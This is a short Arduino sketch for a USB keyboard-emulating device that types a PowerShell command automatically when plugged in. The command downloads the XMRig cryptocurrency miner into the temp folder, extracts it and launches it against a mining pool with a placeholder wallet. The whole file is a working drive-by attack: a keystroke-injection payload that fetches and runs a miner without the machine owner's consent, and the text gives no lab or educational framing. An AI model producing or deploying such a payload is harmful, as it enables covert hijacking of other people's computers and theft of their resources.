#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"iwr https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip -OutFile $env:TEMP\\xmrig.zip; Expand-Archive $env:TEMP\\xmrig.zip -DestinationPath $env:TEMP; Start-Process $env:TEMP\\xmrig.exe -ArgumentList '-o pool.minexmr.com:443 -u YOUR_WALLET'\""));
}
